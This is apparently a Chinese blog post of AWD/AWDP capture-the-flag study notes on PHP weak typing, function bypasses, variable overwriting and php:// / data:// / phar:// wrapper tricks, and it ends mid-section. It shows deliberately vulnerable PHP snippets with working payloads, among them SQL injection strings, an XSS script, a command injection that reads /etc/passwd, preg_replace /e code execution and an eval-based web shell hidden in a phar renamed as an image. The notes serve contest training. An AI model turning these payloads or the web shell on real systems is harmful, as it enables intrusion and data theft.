
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="utf-8" />
        <title>
            awdp知识点总结 | d1e4f1ag&#39;s land
        </title>
        <meta name="author" content="d1e4f1ag" />
        <meta name="description" content="" />
        <meta name="keywords" content="" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
        <link rel="icon" href="/images/avatar2.png" />
        <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />
    <meta name="generator" content="Hexo 7.2.0"></head>

    <body>
        <div class="line" id="line">
            <i class="parallax-line"></i>
            <i class="parallax-line"></i>
        </div>
        <div id="layout">
            <transition name="fade">
                <div id="loading" v-show="loading">
                    <div id="loading-circle">
                        <img id="loading-images2" />
                    </div>
                </div>
            </transition>
            
                <div class="container">
                    <body data-images="/images/background/pic_bg025.png,/images/background/pic_dlc09_01_25.png,/images/background/pic_dlc10_01_07.png,/images/background/pic_loading_bg006.png,/images/background/pic_loading_bg007.png,/images/background/pic_loading_bg012.png,/images/background/pic_loading_bg013.png,/images/background/pic_loading_bg014.png,/images/background/pic_loading_bg015.png,/images/background/pic_loading_bg016.png,/images/background/pic_loading_bg017.png,/images/background/pic_loading_bg018.png,/images/background/pic_loading_bg026.png,/images/background/pic_loading_bg029.png,/images/background/pic_loading_bg030.png,/images/background/pic_loading_bg031.png,/images/background/pic_login_dlc01_01.png,/images/background/pic_login_dlc02_01.png,/images/background/pic_login_dlc03_01.png,/images/background/pic_login_dlc04_01.png,/images/background/pic_login_dlc05_01.png,/images/background/pic_login_dlc06_01.png,/images/background/pic_login_dlc07_01.png,/images/background/pic_login_dlc08_01.png,/images/background/pic_login_dlc09_01.png,/images/background/pic_login_dlc10_01.png,/images/background/PlotCG_007.png,/images/background/PlotCG_011.png,/images/background/PlotCG_012.png,/images/background/PlotCG_014.png,/images/background/PlotCG_015.png,/images/background/PlotCG_016.png,/images/background/PlotCG_017.png,/images/background/PlotCG_018.png,/images/background/PlotCG_021.png,/images/background/PlotCG_022.png,/images/background/PlotCG_023.png,/images/background/PlotCG_025.png,/images/background/PlotCG_026.png,/images/background/PlotCG_029.png,/images/background/PlotCG_035.png,/images/background/PlotCG_058.png,/images/background/PlotCG_063.png,/images/background/PlotCG_064_1.png,/images/background/PlotCG_064_2.png,/images/background/PlotCG_064_3.png,/images/background/PlotCG_064_4.png,/images/background/PlotCG_065_1.png,/images/background/PlotCG_065_2.png,/images/background/PlotCG_067.png,/images/background/PlotCG_069_2.png,/images/background/PlotCG_070_2.png,/images/background/PlotCG_071_1.png,/images/background/PlotCG_072_1.png,/images/background/PlotCG_072_2.png,/images/background/PlotCG_073_1.png,/images/background/PlotCG_076.png,/images/background/PlotCG_104.png,/images/background/PlotCG_111.png,/images/background/PlotCG_112.png,/images/background/PlotCG_113.png,/images/background/PlotCG_114.png,/images/background/PlotCG_115.png,/images/background/PlotCG_115_1.png,/images/background/PlotCG_116.png,/images/background/PlotCG_117.png,/images/background/PlotCG_117_1.png,/images/background/PlotCG_118.png,/images/background/PlotCG_118_2.png,/images/background/PlotCG_119.png,/images/background/PlotCG_120.png,/images/background/PlotCG_121.png,/images/background/PlotCG_122.png,/images/background/PlotCG_123.png,/images/background/PlotCG_124_6.png,/images/background/PlotCG_125_1.png,/images/background/PlotCG_125_2.png,/images/background/PlotCG_126.png,/images/background/PlotCG_127.png,/images/background/PlotCG_127_1.png,/images/background/PlotCG_128_1.png,/images/background/PlotCG_128_2.png,/images/background/PlotCG_129.png,/images/background/PlotCG_417.png,/images/background/PlotCG_418_4.png,/images/background/PlotCG_419.png,/images/background/PlotCG_702.png,/images/background/PlotCG_704.png,/images/background/PlotCG_705.png,/images/background/PlotCG_706.png,/images/background/PlotCG_707.png,/images/background/PlotCG_708.png,/images/background/PlotCG_710.png,/images/background/PlotCG_712.png,/images/background/PlotCG_713.png,/images/background/PlotCG_714.png,/images/background/PlotCG_717_1.png,/images/background/PlotCG_717_3.png,/images/background/PlotCG_718.png,/images/background/PlotCG_719.png,/images/background/PlotCG_720_1.png,/images/background/PlotCG_720_2.png,/images/background/PlotCG_720_3.png,/images/background/PlotCG_721_1.png,/images/background/PlotCG_721_2.png,/images/background/Plot_CG_077.png,/images/background/Plot_CG_078.png,/images/background/Plot_CG_079_1.png,/images/background/Plot_CG_080.png,/images/background/Plot_CG_081_1.png,/images/background/Plot_CG_081_2.png,/images/background/Plot_CG_130_1.png,/images/background/Plot_CG_130_2.png,/images/background/Plot_CG_130_3.png">
    <div class="back" onclick="window.history.back()">
        <b>back</b>
    </div>
    <div class="back2" onclick="window.location.href = '/'">
        <b>HOME</b>
    </div>
    <div class="article">
        <div>
            <h1>awdp知识点总结</h1>
        </div>
        <div class="info">
            <span class="date">
                <span class="icon">
                    <i class="fa-solid fa-calendar fa-fw"></i>
                </span>
                2024/6/2
            </span>
            
            
            <span class="tags">
                <span class="icon">
                    <i class="fa-solid fa-tags fa-fw"></i>
                </span>
                
                
                <span class="tag">
                    
                    <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/" style="color: #00a596">
                        知识点
                    </a>
                </span>
                
            </span>
            
        </div>
        
        <p>PHP + JS知识点总结收录</p>
<p>来源：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44604541/article/details/110149949">https://blog.csdn.net/weixin_44604541/article/details/110149949</a></p>
<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/06/01/awd/">https://fushuling.com/index.php/2023/06/01/awd/</a></p>
<span id="more"></span>

<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="九大全局变量"><a href="#九大全局变量" class="headerlink" title="九大全局变量"></a>九大全局变量</h2><pre><code>$_POST：用于接收post提交的数据
$_GET ：用于获取url地址栏的参数数据
$_FILES ：用于文件接收的处理， img 最常见
$_COOKIE ：用于获取与setCookie()中的name 值
$_SESSION ：用于存储session的值或获取session中的值
$_REQUEST ：具有get、post的功能，但比较慢
$_SERVER：预定义服务器变量的一种
$GLOBALS ：一个包含了全部变量的全局组合数组
$_ENV ：是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它
</code></pre>
<h1 id="二、弱类型以及各种函数"><a href="#二、弱类型以及各种函数" class="headerlink" title="二、弱类型以及各种函数"></a>二、弱类型以及各种函数</h1><h2 id="精度缺陷"><a href="#精度缺陷" class="headerlink" title="精度缺陷"></a>精度缺陷</h2><p>在用PHP进行浮点数的运算中,经常会出现一些和预期结果不一样的值，这是由于浮点数的精度有限<br>尽管取决于系统，PHP 通常使用 IEEE 754 双精度格式，则由于取整而导致的最大相对误差为 1.11e-16<br>非基本数学运算可能会给出更大误差，并且要考虑到进行复合运算时的误差传递</p>
<p>下面看一个有趣的例子感受下:<br><img src="https://s2.loli.net/2024/06/02/GfiqztS2m1yUc7d.png"></p>
<p>以十进制能够精确表示的有理数如 0.1 或 0.7，无论有多少尾数都不能被内部所使用的二进制精确表示<br>因此不能在不丢失一点点精度的情况下转换为二进制的格式</p>
<p>这就会造成混乱的结果：<br>例如，floor((0.1+0.7)*10) 通常会返回 7 而不是预期中的 8，因为该结果内部的表示其实是类似 7.9999999999999991118…</p>
<h2 id="类型转换缺陷"><a href="#类型转换缺陷" class="headerlink" title="类型转换缺陷"></a>类型转换缺陷</h2><p>PHP弱类型语言的一个特性，当一个整形和一个其他类型比较的时候，会先把其他类型intval数字化再比</p>
<pre><code class="php">&lt;?php
    error_reporting(0);
    $flag = &#39;flag&#123;test&#125;&#39;;
    $id = $_GET[&#39;id&#39;];
    is_numeric($id)?die(&quot;Sorry....&quot;):NULL;    
    if($id&gt;2020)&#123;
        echo $flag;
    &#125;
?&gt;
</code></pre>
<p>既要传入非数字，又要比2020大<br>那就传个<code>?id=2021a</code>即可</p>
<h2 id="弱等于和强等于"><a href="#弱等于和强等于" class="headerlink" title="弱等于和强等于"></a>弱等于和强等于</h2><p><img src="https://s2.loli.net/2024/06/02/GfiqztS2m1yUc7d.png" alt="20201125225743380.png"><br><img src="https://s2.loli.net/2024/06/02/2CJq4FnieuAslaL.png" alt="20201125231708898.png"></p>
<p>尤其要关注的是<code>==</code>和<code>===</code></p>
<ul>
<li><code>==</code>会先将字符串类型转换成相同，再比较</li>
<li><code>===</code>会先判断两种字符串的类型是否相等，再比较</li>
</ul>
<p><img src="https://s2.loli.net/2024/06/02/vpOuI2QriZJaVfe.png" alt="image.png"></p>
<p><img src="https://s2.loli.net/2024/06/02/euaTDQYk2JSbrfs.png" alt="20201125231735174.png"></p>
<pre><code class="php">&#39;a&#39;==0   //true
&#39;12a&#39;==12  //true
&#39;1&#39;==1   //true
&#39;1aaaa55sss66&#39;==1  //true
1==true==&quot;1&quot;   //true

&quot;0e123&quot; == &quot;0e456&quot;  //true，0e这类字符串识为科学技术法的数字,0的无论多少次方都是零，所以相等
&quot;0e123&quot; == &quot;0eabc&quot;  //flase，科学计数的指数不可以包含字母  
</code></pre>
<pre><code>QNKCDZO
0e830400451993494058024219903391
  
s878926199a
0e545993274517709034328855841020
  
s155964671a
0e342768416822451524974117254469
  
s214587387a
0e848240448830537924465865611904
  
s214587387a
0e848240448830537924465865611904
  
s878926199a
0e545993274517709034328855841020
  
s1091221200a
0e940624217856561557816327384675
  
s1885207154a
0e509367213418206700842008763514
  
s1502113478a
0e861580163291561247404381396064
  
s1885207154a
0e509367213418206700842008763514
  
s1836677006a
0e481036490867661113260034900752
  
s155964671a
0e342768416822451524974117254469
  
s1184209335a
0e072485820392773389523109082030
  
s1665632922a
0e731198061491163073197128363787
  
s1502113478a
0e861580163291561247404381396064
  
s1836677006a
0e481036490867661113260034900752
  
s1091221200a
0e940624217856561557816327384675
  
s155964671a
0e342768416822451524974117254469
  
s1502113478a
0e861580163291561247404381396064
  
s155964671a
0e342768416822451524974117254469
  
s1665632922a
0e731198061491163073197128363787
  
s155964671a
0e342768416822451524974117254469
  
s1091221200a
0e940624217856561557816327384675
  
s1836677006a
0e481036490867661113260034900752
  
s1885207154a
0e509367213418206700842008763514
  
s532378020a
0e220463095855511507588041205815
  
s878926199a
0e545993274517709034328855841020
  
s1091221200a
0e940624217856561557816327384675
  
s214587387a
0e848240448830537924465865611904
  
s1502113478a
0e861580163291561247404381396064
  
s1091221200a
0e940624217856561557816327384675
  
s1665632922a
0e731198061491163073197128363787
  
s1885207154a
0e509367213418206700842008763514
  
s1836677006a
0e481036490867661113260034900752
  
s1665632922a
0e731198061491163073197128363787
  
s878926199a
0e545993274517709034328855841020
</code></pre>
<h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h2><p>这是个比较字符串的函数</p>
<pre><code class="php">int strcmp ( string $str1 , string $str2 )
</code></pre>
<p>如果 str1 小于 str2 返回 &lt; 0<br>如果 str1 大于 str2 返回 &gt; 0<br>如果两者相等，返回 0<br>问题</p>
<p>在PHP版本为5.3.3至5.5中（不包含5.5），当比较数组和字符串的时候，返回值也是0</p>
<pre><code class="php">&lt;?php
$password=$_GET[&#39;password&#39;];
if(strcmp(&#39;am0s&#39;,$password))&#123;
    echo &#39;false!&#39;;
&#125;else&#123;
    echo &#39;success!&#39;;
&#125;
?&gt;
</code></pre>
<p>绕过</p>
<pre><code>?password[]=1
</code></pre>
<p>除了strcmp()函数外，ereg()和strpos()函数在处理数组的时候也会异常，返回NULL</p>
<h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><p>用于获取变量的整数值<br>在转换时，函数会从字符串起始处进行转换直到遇到一个非数字的字符<br>即使出现无法转换的字符串也不会报错而是返回0</p>
<pre><code class="php">&lt;?php
$a = $_GET[&#39;a&#39;];
if (intval($a) === 666) &#123;
    $sql = &quot;Select a From Table Where Id=&quot;.$a;
    echo $sql;
&#125; else &#123;
    echo &quot;No...&quot;;
&#125;
?&gt;
</code></pre>
<h2 id="sha1-和md5-加密函数"><a href="#sha1-和md5-加密函数" class="headerlink" title="sha1() 和md5()加密函数"></a>sha1() 和md5()加密函数</h2><p>都用于计算字符串的散列值<br>但是两者都无法处理数组，不会抛出异常而是直接返回NULL</p>
<h2 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str()函数"></a>parse_str()函数</h2><p>解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量</p>
<pre><code class="php">void parse_str ( string $str [, array &amp;$arr ] )
</code></pre>
<p>当parse_str()函数的参数值可以被用户控制时，则存在变量覆盖漏洞</p>
<pre><code class="php">&lt;?php
$a = &#39;oop&#39;;
parse_str($_SERVER[&quot;QUERY_STRING&quot;]);

if ($a == &#39;mi1k7ea&#39;) &#123;
    echo &quot;Hacked!&quot;;
&#125; else &#123;
    echo &quot;Hello!&quot;;
&#125;
?&gt;
</code></pre>
<p>结合：</p>
<pre><code class="php">&lt;?php
error_reporting(0);
if(empty($_GET[&#39;id&#39;])) &#123;
    show_source(__FILE__);
    die();
&#125; else &#123;
    include (&#39;flag.php&#39;);
    $a = &quot;www.xxx.com&quot;;
    $id = $_GET[&#39;id&#39;];
    @parse_str($id);
    if ($a[0] != &#39;QNKCDZO&#39; &amp;&amp; md5($a[0]) == md5(&#39;QNKCDZO&#39;)) &#123;
        echo $flag;
    &#125; else &#123;
        exit(&#39;so easy!&#39;);
    &#125;
&#125;
?&gt;
</code></pre>
<p>绕过：</p>
<pre><code>?id=a[0]=240610708
</code></pre>
<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h2><p>用于检测变量是否为数字或数字字符串</p>
<p>可被十六进制的值进行绕过</p>
<pre><code class="php">&lt;?php
$name = $_GET[&#39;name&#39;];
$con = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;hehe123&quot;);
if (!$con)
&#123;
    die(&#39;Could not connect: &#39; . mysql_error());
&#125;

mysql_select_db(&quot;test&quot;, $con);
if (is_numeric($name)) &#123;
    mysql_query(&quot;insert into users values (3,&quot; . $name . &quot;,&#39;test&#39;)&quot;);
&#125;
?&gt;
</code></pre>
<pre><code>1′ union select 1,2,3的十六进制为0x312720756e696f6e2073656c65637420312c322c33
绕过

?name=0x312720756e696f6e2073656c65637420312c322c33
</code></pre>
<h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h2><p>用来判断一个值是否在某一个数组列表里面<br>其缺陷在于存在自动类型转换<br>当输入数字1后再紧跟其他字符串能够Bypass检测数组的功能</p>
<pre><code class="php">&lt;?php
$id = $_GET[&#39;id&#39;];
if (in_array($id, array(1,2,3,4,5,6,7,8,9,0))) &#123;
    $sql = &quot;Select a From users Where Id=&#39;&quot;.$id.&quot;&#39;&quot;;
    echo $sql;
&#125; else &#123;
    echo &quot;No...&quot;;
&#125;
?&gt;

?id=1&#39;union select * from users#
</code></pre>
<h2 id="ereg-和eregi"><a href="#ereg-和eregi" class="headerlink" title="ereg()和eregi()"></a>ereg()和eregi()</h2><p>用于正则匹配，两者的区别在于是否区分大小写<br>使用指定的模式搜索一个字符串中指定的字符串，如果匹配成功则返回true，否则返回false</p>
<p>该函数可被<code>%00</code>截断来Bypass<br>传入数组之后，ereg是返回NULL</p>
<pre><code class="php">&lt;?php
$passwd = $_GET[&#39;passwd&#39;];
if (@ereg(&quot;^[a-zA-Z0-9_]+$&quot;, $passwd)) &#123;
    $sql = &quot;Select username From users Where password=&#39;&quot;.$passwd.&quot;&#39;&quot;;
    echo $sql;
&#125; else &#123;
    echo &quot;No...&quot;;
&#125;
?&gt;
</code></pre>
<p><img src="https://s2.loli.net/2024/06/02/ryLA2tXV5zOgq1C.png" alt="image.png"></p>
<h2 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode()"></a>json_decode()</h2><p>用于对json格式数据进行json解码操作，对于一个json类型的字符串，会解密成一个数组</p>
<p>其存在一个<code>0==&quot;efeaf&quot;</code>的Bypass</p>
<pre><code class="php">&lt;?php
$key = &quot;JsonTest&quot;;
if (isset($_GET[&#39;data&#39;])) &#123;
    $data = json_decode($_GET[&#39;data&#39;]);
    if ($data-&gt;key == $key) &#123;
        echo &quot;Bypass json_decode()!&quot;;
    &#125; else &#123;
        echo &quot;No...&quot;;
    &#125;
&#125;
?&gt;

?data=&#123;&quot;key&quot;:0&#125;
</code></pre>
<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><pre><code>用于执行一个正则表达式匹配

int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )
1
$pattern ：要搜索的模式，字符串形式
$subject： 要搜索检测的目标字符串
$matches： 如果提供了参数matches，它将被填充为搜索结果 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推
$flags： 可设置标记值
$offset： 可选参数 offset 用于指定从目标字符串的某个未知开始搜索(单位是字节)

/i 修饰符
大小写不敏感

&lt;?php
      error_reporting(0);
    $name =  $_GET[&quot;name&quot;];
        if (preg_match(&#39;/script/&#39;, $_GET[&quot;name&quot;])) &#123;
        die(&#39;hacker&#39;);
    &#125;
    echo $name;
?&gt;
1
2
3
4
5
6
7
8
绕过

?name=&lt;Script&gt;alert(2333)&lt;/Script&gt;
1
/m 修饰符
多行匹配
当出现换行符 %0a的时候，会被当做两行处理
此时只可以匹配第 1 行，后面的行就会被忽略

&lt;?php
  if (!(preg_match(&#39;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m&#39;, $_GET[&#39;ip&#39;]))) &#123;
     die(&quot;Invalid IP address&quot;);
  &#125;
  system(&quot;ping -c 2 &quot;.$_GET[&#39;ip&#39;]);
?&gt;
1
2
3
4
5
6
绕过

ip=127.0.0.1%0acat /etc/passwd
</code></pre>
<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><pre><code>执行一个正则表达式的搜索和替换

preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed
1
$pattern ：要搜索的模式，可以是字符串或一个字符串数组
$replacement ：用于替换的字符串或字符串数组
$subject： 要搜索替换的目标字符串或字符串数组
$limit： 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）
$count： 可选，为替换执行的次数

/e修饰符
使 preg_replace() 将 replacement 参数当作 PHP 代码

1、无限传参

&lt;?php
    echo preg_replace($_GET[&quot;pattern&quot;], $_GET[&quot;new&quot;], $_GET[&quot;base&quot;]);
?&gt;

绕过
?pattern=/233/e&amp;new=phpinfo()&amp;base=233

2、简单正则

&lt;?php
    error_reporting(0);
    include(&#39;flag.php&#39;);

    $pattern = $_REQUEST[&quot;pattern&quot;];
    $new = $_POST[&quot;new&quot;];
    $base = &#39;2333&#39;;
    preg_replace(
        $pattern,
        $new,
        $base
    );
?&gt;

绕过
?pattern=/\d/e

3、进阶正则

&lt;?php
    error_reporting(0);

    function complexStrtolower($regex, $value)&#123;
        return preg_replace(&#39;/(&#39;.$regex.&#39;)/ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, $value);
    &#125;

    foreach($_REQUEST as $regex =&gt; $value)&#123;
        echo complexStrtolower($regex, $value) . &quot;\n&quot;;
    &#125;

    highlight_file(__FILE__);
?&gt;
绕过：
\S+=&#123;$&#123;phpinfo()&#125;&#125; 
</code></pre>
<h2 id="register-globals全局变量覆盖"><a href="#register-globals全局变量覆盖" class="headerlink" title="register_globals全局变量覆盖"></a>register_globals全局变量覆盖</h2><p>php.ini中有一项为register_globals，即注册全局变量</p>
<p>register_globals&#x3D;On时，传递过来的值会被直接的注册为全局变量直接使用<br>register_globals&#x3D;Off时，我们需要到特定的数组里去得到它<br>PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除<br>当register_globals&#x3D;On，变量未被初始化且能够用户所控制时，就会存在变量覆盖漏洞</p>
<pre><code class="php">&lt;?php
echo &quot;Register_globals: &quot; . (int)ini_get(&quot;register_globals&quot;) . &quot;&lt;br/&gt;&quot;;
if ($a) &#123;
  echo &quot;Hacked!&quot;;
&#125;
?&gt;
</code></pre>
<h2 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h2><p>从数组中将变量导入到当前的符号表<br>使用数组键名作为变量名，使用数组键值作为变量值<br>针对数组中的每个元素，将在当前符号表中创建对应的一个变量</p>
<pre><code class="PHP">int extract ( array $var_array [, int $extract_type [, string $prefix ]] )
</code></pre>
<p>第二个参数指定函数将变量导入符号表时的行为</p>
<ul>
<li>当值为EXTR_OVERWRITE时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量</li>
<li>值为EXTR_SKIP则表示跳过不覆盖</li>
<li>若第二个参数未指定，则在默认情况下使用EXTR_OVERWRITE</li>
</ul>
<p>当extract()函数从用户可以控制的数组中导出变量且第二个参数未设置或设置为EXTR_OVERWRITE时，就存在变量覆盖漏洞</p>
<p>例：</p>
<pre><code class="php">&lt;?php
$a = &quot;0&quot;;
extract($_GET);
if ($a == 1) &#123;
    echo &quot;Hacked!&quot;;
&#125; else &#123;
    echo &quot;Hello!&quot;;
&#125;
?&gt;

*.php?a=1
</code></pre>
<h2 id="import-request-variables-变量覆盖"><a href="#import-request-variables-变量覆盖" class="headerlink" title="import_request_variables()变量覆盖"></a>import_request_variables()变量覆盖</h2><p>将GET、POST、Cookies中的变量导入到全局<br>4.1.0 &lt;&#x3D; PHP &lt; 5.4.0</p>
<pre><code class="PHP">bool import_request_variables (string $types [, string $prefix])
</code></pre>
<ul>
<li>$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE</li>
<li>第二个参数为要注册变量的前缀</li>
</ul>
<p>例：</p>
<pre><code class="php">&lt;?php
$a = &quot;0&quot;;
import_request_variables(&quot;G&quot;);

if ($a == 1) &#123;
  echo &quot;Fucked!&quot;;
&#125; else &#123;
  echo &quot;Nothing!&quot;;
&#125;
?&gt;
    
*.php?a=1
</code></pre>
<h2 id="导致的变量覆盖"><a href="#导致的变量覆盖" class="headerlink" title="$$导致的变量覆盖"></a>$$导致的变量覆盖</h2><ul>
<li><p><code>$var</code>是一个正常变量，名称为：var，存储任何值，如：string，integer，float等</p>
</li>
<li><p><code>$$var</code>是一个引用变量，用于存储<code>$var</code>的值</p>
</li>
</ul>
<p>例：</p>
<pre><code class="php">&lt;?php
foreach (array(&#39;_COOKIE&#39;,&#39;_POST&#39;,&#39;_GET&#39;) as $_request)  
&#123;
    foreach ($$_request as $_key=&gt;$_value)  
    &#123;
        $$_key=  $_value;
    &#125;
&#125;
$id = isset($id) ? $id : &quot;test&quot;;
if($id === &quot;mi1k7ea&quot;) &#123;
    echo &quot;flag&#123;xxxxxxxxxx&#125;&quot;;
&#125; else &#123;
    echo &quot;Nothing...&quot;;
&#125;
?&gt;

传入id=mi1k7ea的时候，会直接给下面的id赋值为mi1k7ea
</code></pre>
<h2 id="strstr-函数"><a href="#strstr-函数" class="headerlink" title="strstr()函数"></a>strstr()函数</h2><p>大小写敏感</p>
<p>strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。</p>
<p>该函数是区分大小写的。如需进行不区分大小写的搜索，请使用 stristr() 函数。</p>
<h2 id="mt-rand-函数"><a href="#mt-rand-函数" class="headerlink" title="mt_rand()函数"></a>mt_rand()函数</h2><p>问题在于每个php cgi进程期间，只有第一次调用mt_rand()会自动播种<br>接下来都会根据这个第一次播种的种子来生成随机数</p>
<p>所以可以通过逆向得到随机种子<br>然后获取后面其他随机数<br>如路径之类的信息就有了</p>
<p>工具：<a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/">php_mt_seed</a></p>
<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>php伪协议主要有以下</p>
<ul>
<li><p>file:&#x2F;&#x2F;：用于访问本地文件系统读取本地文件</p>
</li>
<li><p>php:&#x2F;&#x2F;：访问各个输入&#x2F;输出流（I&#x2F;O streams），其中php:&#x2F;&#x2F;filter用于读取文件内容，php:&#x2F;&#x2F;input可以访问请求的原始数据的只读流、同时可将post请求中的数据作为PHP代码执行</p>
</li>
<li><p>zip:&#x2F;&#x2F;，bzip2:&#x2F;&#x2F;，zlib:&#x2F;&#x2F;：均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名</p>
</li>
<li><p>data:&#x2F;&#x2F;：写入数据</p>
</li>
<li><p>phar:&#x2F;&#x2F;：PHP归档</p>
</li>
</ul>
<p>通常都会用在文件包含上</p>
<h2 id="php-输入输出流"><a href="#php-输入输出流" class="headerlink" title="php:&#x2F;&#x2F;输入输出流"></a>php:&#x2F;&#x2F;输入输出流</h2><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><pre><code class="php">?filename=php://filter/convert.base64-encode/resource=xxx.php
?filename=php://filter/read=convert.base64-encode/resource=xxx.php 
</code></pre>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>…</p>
<h2 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><p>…</p>
<h2 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><ul>
<li>php版本大于等于php5.2</li>
<li>必须同时开启<code>allow_url_fopen</code>和<code>allow_url_include</code></li>
</ul>
<pre><code>data:text/plain;base64, &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;
data://text/plain;base64, &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;
data:text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=
data://text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=

?file=data:text/plain,&lt;?php phpinfo();?&gt;
index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
</code></pre>
<h2 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h2><p>php解压缩包的一个函数<br>不管后缀是什么，都会当做压缩包来解压</p>
<p>条件</p>
<ul>
<li>压缩包需要zip协议压缩</li>
<li>php版本大于等于php5.3.0</li>
</ul>
<p>用法</p>
<ul>
<li>一句话木马文件shell.php</li>
<li>用zip协议压缩为shell.zip</li>
<li>将后缀改为png等其他格式</li>
<li>上传</li>
<li>访问</li>
</ul>
<pre><code class="php">GET: ?filename=phar://shell.png/shell.php

POST: cmd=phpinfo();
</code></pre>
<p>使用<code>Phar://</code>伪协议流可以Bypass一些上传的waf，大多数情况下和文件包含一起使用，就类似于我们的压缩包（其实就是一个压缩包），只不过我们换了一种方式去执行而已<br>写一段小代码测试一下：<br>test.php</p>
<pre><code>&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;
</code></pre>
<p>然后将test.php压缩，将压缩文件改后缀为<code>.jpg</code><br>index.php</p>
<pre><code>&lt;?php 
include(&#39;phar://./test.jpg/test.php&#39;);
?&gt;
</code></pre>
<p>成功包含</p>
<p>我们一般利用反序列漏洞，一般都是借助unserialize()函数，不过随着人们安全的意识的提高这种漏洞利用越来越来难了，但是在今年8月份的Blackhat2018大会上，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。漏洞触发是利用Phar:&#x2F;&#x2F; 伪协议读取phar文件时，会反序列化meta-data储存的信息。</p>
<p>Phar文件结构</p>
<p>Phar文件主要包含三至四个部分：</p>
<ol>
<li>A stub</li>
</ol>
<p>stub的基本结构：&lt;?php <strong>HALT_COMPILER();，stub必须以</strong>HALT_COMPILER();来作为结束部分，否则Phar拓展将不会识别该文件。</p>
<ol start="2">
<li>a manifest describing the contents</li>
</ol>
<p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以反序列化的形式储存，这里就是漏洞利用的关键点</p>
<ol start="3">
<li>the file contents</li>
</ol>
<p>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</p>
<ol start="4">
<li>a signature for verifying Phar integrity</li>
</ol>
<p>签名格式</p>
<p>小测试</p>
